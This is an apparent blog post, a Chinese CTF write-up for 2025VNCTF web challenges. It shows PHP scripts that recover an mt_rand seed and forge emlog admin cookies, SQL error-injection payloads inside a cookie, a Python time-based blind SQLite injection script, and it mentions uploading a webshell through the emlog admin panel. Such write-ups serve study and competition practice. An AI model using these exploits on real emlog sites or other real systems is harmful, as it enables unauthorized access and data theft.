@@ -1,0 +1,397 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025VNCTF | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="WEBez_emlog 猴子大王在1月23日开始学习Web安全并搭建了一个博客，你能找到他博客的漏洞吗。   一条人一只烟 一道web干一天 也是给我挖上0day了  拉源码做审计  跟一下，使用mt_rand生成随机数  由于这两个都调用了getRandStr函数，分别查看调用  account.php的logout接口设置了cookie，可以访问看一下   果然返回了，那么就可以逆序getRa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025VNCTF">
+<meta property="og:url" content="https://xyaxxya.github.io/2025/02/10/2025VNCTF/index.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="WEBez_emlog 猴子大王在1月23日开始学习Web安全并搭建了一个博客，你能找到他博客的漏洞吗。   一条人一只烟 一道web干一天 也是给我挖上0day了  拉源码做审计  跟一下，使用mt_rand生成随机数  由于这两个都调用了getRandStr函数，分别查看调用  account.php的logout接口设置了cookie，可以访问看一下   果然返回了，那么就可以逆序getRa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?3099">
+<meta property="article:published_time" content="2025-02-10T10:04:34.000Z">
+<meta property="article:modified_time" content="2025-02-11T09:07:27.800Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?3099"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2025/02/10/2025VNCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025VNCTF',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-11 17:07:27'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?3099')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2025VNCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-10T10:04:34.000Z" title="发表于 2025-02-10 18:04:34">2025-02-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-11T09:07:27.800Z" title="更新于 2025-02-11 17:07:27">2025-02-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2025/02/10/2025VNCTF/" data-flag-title="2025VNCTF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/02/10/2025VNCTF/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2025/02/10/2025VNCTF/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><blockquote>
+<p>猴子大王在1月23日开始学习Web安全并搭建了一个博客，你能找到他博客的漏洞吗。</p>
+</blockquote>
+<blockquote>
+<p>一条人一只烟 一道web干一天</p>
+<p>也是给我挖上0day了</p>
+</blockquote>
+<p>拉源码做审计</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164547850.png" alt="image-20250208164547850"></p>
+<p>跟一下，使用mt_rand生成随机数</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208164602668.png" alt="image-20250208164602668"></p>
+<p>由于这两个都调用了getRandStr函数，分别查看调用</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165139326.png" alt="image-20250208165139326"></p>
+<p>account.php的logout接口设置了cookie，可以访问看一下</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165253362.png" alt="image-20250208165253362"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c83d4f3bfbad7deb7f795e1d8e6ed7b.png" alt="c83d4f3bfbad7deb7f795e1d8e6ed7b"></p>
+<p>果然返回了，那么就可以逆序getRandStr进行解密后补零进行seed爆破</p>
+<blockquote>
+<p>mt_rand()函数的特性-MT19937</p>
+<ul>
+<li>MT19937有624个内部状态</li>
+<li>每个状态是32位整数</li>
+<li>需要624个连续的输出才能完全确定内部状态</li>
+</ul>
+<p>我们需要补32组0 0 0 0提供足够的状态信息</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"><span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$p</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$number</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$chars</span>, <span class="variable">$p</span>[<span class="variable">$i</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$number</span> <span class="subst">$number</span> 0 <span class="subst">$chars_length</span> &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208171304459.png" alt="image-20250208171304459"></p>
+<p>得到seed</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208165953689.png" alt="image-20250208165953689"></p>
+<p>拿到种子第一件事就是伪造cookie</p>
+<p>但是在loginauth.php中发现与用户名有关联</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170520901.png" alt="image-20250208170520901"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208170612645.png" alt="image-20250208170612645"></p>
+<p>于是想到sql注入，将username部分进行报错注入（exp下面有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/../ HTTP/1.1</span><br><span class="line">Host: node.vnteam.cn:48595</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0</span><br><span class="line">Cookie: EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=1&#x27; and updatexml(1,concat(0x7e,(select(database())),0x7e),1) #|0|a916cc182f4f3d080acb6a0b356da6a7</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node.vnteam.cn:48595/admin/account.php?action=logout</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/956ca770bed18d7171fb2eb80452858.png" alt="956ca770bed18d7171fb2eb80452858"></p>
+<p>中间靶机到期了</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155050122.png" alt="image-20250208155050122"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155205361.png" alt="image-20250208155205361"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155230657.png" alt="image-20250208155230657"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208155346815.png" alt="image-20250208155346815"></p>
+<p>到这里停了，看到user表，可以停住进去查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select GROUP_CONCAT(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;emlog_user&#x27;),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以查看username</p>
+<p>最终exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seed</span> = <span class="number">2430606281</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;</span><br><span class="line"><span class="variable">$retStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$retStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;</span>);</span><br><span class="line"><span class="variable">$authkey</span> = <span class="variable">$retStr</span> . <span class="variable">$ua</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;1&#x27; and updatexml(1,concat(0x7e,(select substr(group_concat(username),20,32) from emlog.emlog_user),0x7e),1) #&quot;</span>;</span><br><span class="line"><span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$authkey</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$expiration</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$hash</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208160349190.png" alt="image-20250208160349190"></p>
+<p>得到username（一共33位，substr截断即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1QXgVCpRbGseY_UA6DPDV1K8XOCZHUxm</span><br></pre></td></tr></table></figure>
+
+<p>伪造admin身份进后台</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seed</span> = <span class="number">2430606281</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$rand_string</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;</span><br><span class="line"><span class="variable">$retStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$retStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$rand_string</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$rand_string</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;</span>);</span><br><span class="line"><span class="variable">$authkey</span> = <span class="variable">$retStr</span> . <span class="variable">$ua</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;1QXgVCpRbGseY_UA6DPDV1K8XOCZHUxm&quot;</span>;</span><br><span class="line"><span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$authkey</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$expiration</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$hash</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161237958.png" alt="image-20250208161237958"></p>
+<p>然后就简单了，对着开发文档上传木马即可</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aiquan9342/article/details/102075533">emblog后台拿shell-CSDN博客</a></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208161753904.png" alt="image-20250208161753904"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162459529.png" alt="image-20250208162459529"></p>
+<p>创建对应目录结构然后打包上传</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162526373.png" alt="image-20250208162526373"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162608905.png" alt="image-20250208162608905"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162738604.png" alt="image-20250208162738604"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250208162748410.png" alt="image-20250208162748410"></p>
+<h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h2><blockquote>
+<p>小朋友们你们好呀，我是奶龙，请帮我找到username和password，获得胖猫留下的flag吧 &#x2F;&#x2F;容易炸链接，可以多试几次</p>
+</blockquote>
+<blockquote>
+<p>时间盲注 过滤了sleep使用randomblob延时</p>
+<p>过滤&#x3D; 使用&gt;和二分法进行注入</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:44425/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        payload = <span class="string">&quot;-1&#x27; or (case when(substr((select hex(group_concat(sql)) from sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;) then randomblob(300000000) else 0 end)/*&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">chr</span>(mid))</span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27; or (case when(substr((select hex(group_concat(username)) from users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;) then randomblob(50000000) else 0 end)/*&quot;</span></span><br><span class="line">        <span class="comment"># payload = &quot;-1&#x27; or (case when(substr((select hex(group_concat(username)) from users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;) then randomblob(50000000) else 0 end)/*&quot;</span></span><br><span class="line">        payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">        payload = payload.<span class="built_in">format</span>(i, <span class="built_in">chr</span>(mid))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(datas)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.post(url=url, json=datas)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        spend_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spend_time &gt;= <span class="number">0.19</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> + <span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h2><blockquote>
+<p>Infernity师傅用某个单文件框架给他的老师写了一个“学生姓名登记系统”，并且对用户的输入做了严格的限制，他自认为他的系统无懈可击，但是真的无懈可击吗？</p>
+</blockquote>
